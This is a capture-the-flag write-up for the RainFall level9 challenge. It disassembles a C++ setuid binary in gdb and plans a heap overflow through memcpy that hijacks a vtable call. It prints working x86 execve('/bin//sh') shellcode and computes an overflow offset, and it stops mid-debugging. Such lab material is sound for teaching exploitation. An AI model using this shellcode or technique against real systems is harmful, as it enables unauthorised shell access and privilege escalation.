# Preparations

Entering level9 home directory we see a level9 binary with sticky bit in access rights.
By objdumping the binary we see only main function with classes:

	level9@RainFall:~$ objdump -D -M intel-mnemonic level9 > /tmp/dump9

Why do we do objdump first? Maybe in this exercise a function exists but is not used so we need to see all the functions.

# Code writing

We start to work with gdb in Intel syntax (set disassembly-flavor intel):

	(gdb) disass main
	Dump of assembler code for function main:
	   0x080485f4 <+0>:	push   ebp
	   0x080485f5 <+1>:	mov    ebp,esp
	   0x080485f7 <+3>:	push   ebx
	   0x080485f8 <+4>:	and    esp,0xfffffff0
	   0x080485fb <+7>:	sub    esp,0x20
	   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1			;check arguments
	   0x08048602 <+14>:	jg     0x8048610 <main+28>			;jump if not according to condition (first operand is more than second operand)
	   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1			;argument for exit
	   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>			;call exit
	   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c			;preparation to calling the class
	   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>			;calling the class
	   0x0804861c <+40>:	mov    ebx,eax					;preparations to calling the method
	   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5			;argument for calling the method
	   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx			;preparations to calling the method
	   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>			;calling the method new
	   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx			;result to the variable
	   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c			;preparation to calling the class
	   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>			;calling the class
	   0x0804863e <+74>:	mov    ebx,eax					;preparations to calling the method
	   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6			;argument for calling the method
	   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx			;preparations to calling the method
	   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>			;calling the method new
	   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx			;result to the variable
	   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]			;dealing with variable where we put result with 5
	   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax			;put variable to stack
	   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]			;dealing with variable where we put result with 6
	   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax			;put variable to stack
	   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]			;taking the argument array
	   0x08048667 <+115>:	add    eax,0x4					;taking the first argument from the array
	   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]			;preparing arguments for the method setAnnotation
	   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax			;preparing arguments for the method setAnnotation
	   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]			;preparing arguments for the method setAnnotation
	   0x08048674 <+128>:	mov    DWORD PTR [esp],eax			;preparing arguments for the method setAnnotation
	   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>	;call method setAnnotation
	   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]			;dealing with variable where we put result with 6
	   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]			;dereferencing pointer
	   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]			;dereferencing pointer
	   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]			;dealing with variable where we put result with 5
	   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax			;preparation for calling the function
	   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]			;preparation for calling the function
	   0x08048690 <+156>:	mov    DWORD PTR [esp],eax			;preparation for calling the function
	   0x08048693 <+159>:	call   edx					;calling function from class
	   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
	   0x08048698 <+164>:	leave
	   0x08048699 <+165>:	ret
	End of assembler dump.

Plus we need to see what is inside the classes (we saw them in dump from objdump):

	(gdb) disass _ZN1NC2Ei
	Dump of assembler code for function _ZN1NC2Ei:
	   0x080486f6 <+0>:	push   ebp
	   0x080486f7 <+1>:	mov    ebp,esp
	   0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]			;dealing with argument to the method
	   0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848		;address to the other method
	   0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]			;dealing with argument to the method
	   0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]			;dealing with something from the class
	   0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx			;result of something from the class
	   0x0804870b <+21>:	pop    ebp
	   0x0804870c <+22>:	ret
	End of assembler dump.
	(gdb) disass _ZN1N13setAnnotationEPc
	Dump of assembler code for function _ZN1N13setAnnotationEPc:
	   0x0804870e <+0>:	push   ebp
	   0x0804870f <+1>:	mov    ebp,esp
	   0x08048711 <+3>:	sub    esp,0x18
	   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]			;preparation to strlen, argument to the method
	   0x08048717 <+9>:	mov    DWORD PTR [esp],eax			;preparation to strlen
	   0x0804871a <+12>:	call   0x8048520 <strlen@plt>			;call strlen
	   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]			;result of strlen
	   0x08048722 <+20>:	add    edx,0x4					;shift 4 bytes in buffer 
	   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax			;preparations to memcpy
	   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]			;preparations to memcpy
	   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax			;preparations to memcpy
	   0x08048730 <+34>:	mov    DWORD PTR [esp],edx			;preparations to memcpy
	   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>			;call memcpy
	   0x08048738 <+42>:	leave
	   0x08048739 <+43>:	ret
	End of assembler dump.
	(gdb) disass _ZN1NplERS_
	Dump of assembler code for function _ZN1NplERS_:
	   0x0804873a <+0>:	push   ebp
	   0x0804873b <+1>:	mov    ebp,esp
	   0x0804873d <+3>:	mov    eax,DWORD PTR [ebp+0x8]			;dealing with argument to method
	   0x08048740 <+6>:	mov    edx,DWORD PTR [eax+0x68]			;dealing with what we add to the value inside the method
	   0x08048743 <+9>:	mov    eax,DWORD PTR [ebp+0xc]			;dealing with argument to method
	   0x08048746 <+12>:	mov    eax,DWORD PTR [eax+0x68]			;dealing with argument to method
	   0x08048749 <+15>:	add    eax,edx					;the main action
	   0x0804874b <+17>:	pop    ebp
	   0x0804874c <+18>:	ret
	End of assembler dump.
	(gdb) disass _ZN1NmiERS_
	Dump of assembler code for function _ZN1NmiERS_:
	   0x0804874e <+0>:	push   ebp
	   0x0804874f <+1>:	mov    ebp,esp
	   0x08048751 <+3>:	mov    eax,DWORD PTR [ebp+0x8]			;dealing with argument to method
	   0x08048754 <+6>:	mov    edx,DWORD PTR [eax+0x68]			;dealing with what we substract from the value inside the method
	   0x08048757 <+9>:	mov    eax,DWORD PTR [ebp+0xc]			;dealing with argument to method
	   0x0804875a <+12>:	mov    eax,DWORD PTR [eax+0x68]			;dealing with argument to method
	   0x0804875d <+15>:	mov    ecx,edx					;the main action
	   0x0804875f <+17>:	sub    ecx,eax					;the main action
	   0x08048761 <+19>:	mov    eax,ecx					;the main action
	   0x08048763 <+21>:	pop    ebp
	   0x08048764 <+22>:	ret
	End of assembler dump.

Let's transfer numbers from hex to decimal in methods and see what is inside the adresses:

	(gdb) p 0x68
		$2 = 104
		(gdb) p 0x8
		$3 = 8
		(gdb) p 0xc
		$4 = 12
	(gdb) x/wx 0x8048848
		0x8048848 <_ZTV1N+8>:	0x0804873a
		(gdb) x/wx 0x0804873a
		0x804873a <_ZN1NplERS_>:	0x8be58955

So from one method we call some other one not directly but through the table. Finally we write the code in C++.

# Exploitation

Explotation is done because of dereferencing and how data (strings and numbers lie in the class). We can overwrite values and insert shellcode with the help of `memcpy` in setAnnotation method. Why do we need shellcode? Inside this level we do not see any calls of `system` or `execve` and we need to get control of the terminal under user bonus0. So we need to insert shellcode as a spoiled pillow to some place in the code. What shellcode for linux x86 we will use:

	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

What does it mean:

	Disassembly of section .text:

	08048060 <_start>:
	 8048060: 31 c0                 xor    %eax,%eax
	 8048062: 50                    push   %eax
	 8048063: 68 2f 2f 73 68        push   $0x68732f2f	;'//sh'
	 8048068: 68 2f 62 69 6e        push   $0x6e69622f	;'/bin'
	 804806d: 89 e3                 mov    %esp,%ebx	;copy string (command) address
	 804806f: 89 c1                 mov    %eax,%ecx
	 8048071: 89 c2                 mov    %eax,%edx
	 8048073: b0 0b                 mov    $0xb,%al	;11
	 8048075: cd 80                 int    $0x80	;execve()
	 8048077: 31 c0                 xor    %eax,%eax
	 8048079: 40                    inc    %eax
	 804807a: cd 80                 int    $0x80	;restart_syscall()

Shellcode length is 28 bytes that is very important because we need to count where to put it so that it is executed and does not break the programm.
We count where to put the shellcode while counting `EIP` offset. This we can do with the help of special strings: https://wiremask.eu/tools/buffer-overflow-pattern-generator/. We get address 0x41366441 that means that offset is 108:

	Breakpoint 6, 0x08048677 in main ()
	(gdb) x/50wx $ebp+0xc
		0xbffff644:	0xbffff6d4	0xbffff6e0	0xb7fdc860	0x00000000
	(gdb) x/50wx 0xbffff6d4
		0xbffff6d4:	0xbffff7f9	0xbffff812	0x00000000	0xbffff8db
	(gdb) x/100wx 0xbffff7f9
		0xbffff7f9:	0x6d6f682f	0x73752f65	0x6c2f7265	0x6c657665
		0xbffff809:	0x656c2f39	0x396c6576	0x30614100	0x41316141
		0xbffff819:	0x61413261	0x34614133	0x41356141	0x61413661
		0xbffff829:	0x38614137	0x41396141	0x62413062	0x32624131
		0xbffff839:	0x41336241	0x62413462	0x36624135	0x41376241
		0xbffff849:	0x62413862	0x30634139	0x41316341	0x63413263
		0xbffff859:	0x34634133	0x41356341	0x63413663	0x38634137
		0xbffff869:	0x41396341	0x64413064	0x32644131	0x41336441
		0xbffff879:	0x64413464	0x36644135	0x41376441	0x64413864
		0xbffff889:	0x30654139	0x41316541	0x65413265	0x34654133
		0xbffff899:	0x41356541	0x65413665	0x38654137	0x41396541
		0xbffff8a9:	0x66413066	0x32664131	0x41336641	0x66413466
		0xbffff8b9:	0x36664135	0x41376641	0x66413866	0x30674139
		0xbffff8c9:	0x41316741	0x67413267	0x34674133	0x41356741
		0xbffff8d9:	0x45540067	0x783d4d52	0x6d726574	0x3635322d
		0xbffff8e9:	0x6f6c6f63	0x48530072	0x3d4c4c45	0x6e69622f
		0xbffff8f9:	0x7361622f	0x53530068	0x4c435f48	0x544e4549
		0xbffff909:	0x3239313d	0x3836312e	0x2e39392e	0x31352031
		0xbffff919:	0x20363035	0x32343234	0x48535300	0x5954545f
		0xbffff929:	0x65642f3d	0x74702f76	0x00302f73	0x52455355
		0xbffff939:	0x76656c3d	0x00396c65	0x435f534c	0x524f4c4f
		0xbffff949:	0x73723d53	0x643a303d	0x31303d69	0x3a34333b
		0xbffff959:	0x303d6e6c	0x36333b31	0x3d686d3a	0x703a3030
		0xbffff969:	0x30343d69	0x3a33333b	0x303d6f73	0x35333b31
		0xbffff979:	0x3d6f643a	0x333b3130	0x64623a35	0x3b30343d

Here lies our argument before the method `setAnnotation`. Let's continue and go inside `setAnnotation` with our generated string as an argument:

	Breakpoint 9, 0x08048733 in N